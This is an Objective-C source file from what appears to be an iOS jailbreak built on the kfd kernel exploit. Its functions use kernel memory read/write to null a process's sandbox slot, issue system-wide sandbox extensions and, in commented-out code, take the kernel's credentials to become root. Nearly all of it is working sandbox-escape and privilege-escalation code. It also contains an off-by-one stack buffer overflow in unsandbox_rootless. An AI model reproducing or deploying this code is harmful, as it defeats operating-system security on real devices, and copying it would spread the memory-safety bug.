//
//  sandbox.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/19.
//

#import <Foundation/Foundation.h>
#import <stdbool.h>
#import "offsets.h"
#import "krw.h"
#import "sandbox.h"
#import "proc.h"
#import "escalate.h"
#import "boot_info.h"

#include <UIKit/UIKit.h>

#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_GREATER_THAN(v)              ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN(v)                 ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)     ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)


/*
 
 uint64_t self_ro = rk64(kfd, proc_addr + 0x20);
 util_printf("self_ro @ 0x%llx\n", self_ro);
 uint64_t self_ucred = rk64(kfd, self_ro + 0x20);
 util_printf("ucred @ 0x%llx\n", self_ucred);
 util_printf("test_uid = %d\n", getuid());

 uint64_t kernproc = proc_of_pid2(kfd, 0);
 util_printf("kern proc @ %llx\n", kernproc);
 uint64_t kern_ro = rk64(kfd, kernproc + 0x20);
 util_printf("kern_ro @ 0x%llx\n", kern_ro);
 uint64_t kern_ucred = rk64(kfd, kern_ro + 0x20);
 util_printf("kern_ucred @ 0x%llx\n", kern_ucred);

 // use proc_set_ucred to set kernel ucred.
 kcall2(proc_set_ucred_func, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
 setuid(0);
 setuid(0);
 util_printf("getuid: %d\n", getuid());

 */



/*
 uint64_t selfProc = self_proc();
 uint64_t selfUcred = proc_get_ucred(selfProc);
 
 bool kernelProcNeedsFree = NO;
 uint64_t kernelProc = proc_for_pid(0, &kernelProcNeedsFree);
 if (kernelProcNeedsFree) {
     proc_rele(kernelProc);
 }
 uint64_t kernelUcred = proc_get_ucred(kernelProc);

 proc_set_ucred(selfProc, kernelUcred);
 block();
 proc_set_ucred(selfProc, selfUcred);
 */

#define MAKE_KPTR(v) (v | 0xffffff8000000000)

uint64_t unsandbox(pid_t pid) {
    printf("[*] Unsandboxing pid %d\n", pid);
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
//18446744017486185808
        uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
        
        uint64_t proc_ro = kread64(proc + off_p_ro); // pid credentials
        uint64_t cr_label = kread64(proc_ro + off_u_cr_label); // MAC label
        if (cr_label == 0){
            exit(1);
        }
        uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);

       // uint64_t prock = proc_of_pid(0); // pid's proccess structure on the kernel
       // uint64_t ucredk = kread64(prock + off_p_ro); // pid credentials
        //uint64_t cr_labelk = kread64(ucredk + off_u_cr_label); // MAC label



        kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
        return (kread64(kread64(proc_ro + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;

    } else {
        uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
        uint64_t ucred = kread64(proc + off_p_ucred); // pid credentials
        uint64_t cr_label = kread64(ucred + off_u_cr_label); // MAC label
        uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);
        kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
        return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == 0) ? orig_sb : NO;
    }
}

BOOL sandbox(pid_t pid, uint64_t sb) {
    if (!pid) return NO;
    
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
        //printf("[*] Sandboxing pid %d with slot at 0x%llx\n", pid, sb);
        uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
        uint64_t ucred = kread64(proc + off_p_ro); // pid credentials
        uint64_t cr_label = kread64(ucred + off_u_cr_label); /* MAC label */
        kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, sb);
        return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == sb) ? YES : NO;
    } else {
        printf("[*] Sandboxing pid %d with slot at 0x%llx\n", pid, sb);
        uint64_t proc = proc_of_pid(pid); // pid's proccess structure on the kernel
        uint64_t ucred = kread64(proc + off_p_ucred); // pid credentials
        uint64_t cr_label = kread64(ucred + off_u_cr_label); /* MAC label */
        kwrite64(cr_label + off_sandbox_slot /* First slot is AMFI's. so, this is second? */, sb);
        return (kread64(kread64(ucred + off_u_cr_label) + off_sandbox_slot) == sb) ? YES : NO;

    }
}

char* token_by_sandbox_extension_issue_file(const char *extension_class, const char *path, uint32_t flags) {
    uint64_t self_ucreds = borrow_ucreds(getpid(), 1);
    char *ret = sandbox_extension_issue_file(extension_class, path, flags);
    unborrow_ucreds(getpid(), self_ucreds);
    
    return ret;
}

char *generateSystemWideSandboxExtensions(void) {
    uint64_t self_ucreds = borrow_ucreds(getpid(), 1);
    
  NSMutableString *extensionString = [NSMutableString new];

  // Make /var/jb readable
  [extensionString appendString:[NSString stringWithUTF8String:sandbox_extension_issue_file("com.apple.app-sandbox.read", prebootPath(nil).fileSystemRepresentation, 0)]];
  [extensionString appendString:@"|"];

  // Make binaries in /var/jb executable
    [extensionString appendString:[NSString stringWithUTF8String:sandbox_extension_issue_file("com.apple.sandbox.executable", prebootPath(nil).fileSystemRepresentation, 0)]];
  [extensionString appendString:@"|"];

  // Ensure the whole system has access to kr.h4ck.jailbreakd.systemwide
  [extensionString appendString:[NSString stringWithUTF8String:sandbox_extension_issue_mach("com.apple.app-sandbox.mach", "kr.h4ck.jailbreakd.systemwide", 0)]];
  [extensionString appendString:@"|"];
  [extensionString appendString:[NSString stringWithUTF8String:sandbox_extension_issue_mach("com.apple.security.exception." "mach-lookup.global-name", "kr.h4ck.jailbreakd.systemwide", 0)]];
    unborrow_ucreds(getpid(), self_ucreds);

  return extensionString.UTF8String;
}

void unsandbox_rootless(char* extensions) {
  char extensionsCopy[strlen(extensions)];
  strcpy(extensionsCopy, extensions);
  char *extensionToken = strtok(extensionsCopy, "|");
  while (extensionToken != NULL) {
    sandbox_extension_consume(extensionToken);
    extensionToken = strtok(NULL, "|");
  }
}
